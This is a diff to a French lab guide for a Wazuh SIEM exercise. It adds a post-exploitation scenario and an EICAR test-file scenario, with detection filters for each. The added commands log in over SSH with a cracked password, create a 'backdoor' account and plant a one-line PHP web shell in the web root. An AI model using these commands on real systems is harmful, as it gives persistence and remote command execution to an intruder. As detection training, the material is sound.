@@ -116,6 +116,54 @@ Les requêtes de nikto remontent en **« Web server 400 error code »** (règle 
 elles se répètent depuis la même IP, en **« Multiple web server 400 error codes from same
 source ip »** (règle 31151, niveau 10).
 
+### 2.5 Scénario « post-exploitation » (après l'intrusion)
+
+Une fois le mot de passe cassé, l'attaquant se connecte en SSH et s'installe. Depuis la machine
+attaquante :
+
+```bash
+vagrant ssh attacker
+sshpass -p admin123 ssh -o StrictHostKeyChecking=no admin@203.0.113.1
+# puis, sur pc1 (admin peut passer root — misconfig volontaire) :
+sudo useradd -m backdoor                                    # persistance : nouveau compte
+echo '<?php system($_GET[c]); ?>' | sudo tee /var/www/html/shell.php   # webshell
+```
+
+Filtre :
+
+```
+agent.name:pc1 and (rule.id:5902 or rule.id:5403 or rule.id:554)
+```
+
+![Chaîne de post-exploitation](images/08-postex-events.png)
+
+On voit toute la **kill chain** sur pc1 : **escalade de privilèges** (*First time user executed
+sudo*, règle 5403), **persistance** (*New user added to the system*, règle 5902, niveau 8), et
+**dépôt de fichier** dans le web root (*File added to the system*, règle 554 via le FIM temps réel).
+
+### 2.6 Scénario « dépôt de malware (EICAR) »
+
+Toujours sur pc1, l'attaquant dépose le fichier de test antivirus standard **EICAR** :
+
+```bash
+printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
+  | sudo tee /var/www/html/eicar.com
+```
+
+Filtre :
+
+```
+agent.name:pc1 and rule.id:554 and syscheck.path:*eicar*
+```
+
+Déplie l'alerte (🔍) :
+
+![Détail FIM du fichier EICAR](images/09-eicar-detail.png)
+
+Le **FIM en temps réel** (`decoder: syscheck_new_entry`) a capté la création du fichier :
+`File '/var/www/html/eicar.com' added — Mode: realtime`. Avec une clé API VirusTotal
+(intégration Wazuh optionnelle), ce hash serait en plus identifié comme malveillant.
+
 ---
 
 ## 3. Antisèche des filtres
@@ -127,6 +175,8 @@ source ip »** (règle 31151, niveau 10).
 | Brute force SSH | `agent.name:pc1 and rule.groups:authentication_failures` |
 | Intrusion réussie après brute force | `agent.name:pc1 and rule.id:40112` |
 | Scan web | `agent.name:pc1 and rule.groups:web` |
+| Post-exploitation (escalade + persistance) | `agent.name:pc1 and (rule.id:5902 or rule.id:5403 or rule.id:554)` |
+| Dépôt de malware EICAR (FIM) | `agent.name:pc1 and rule.id:554 and syscheck.path:*eicar*` |
 
 ---
 
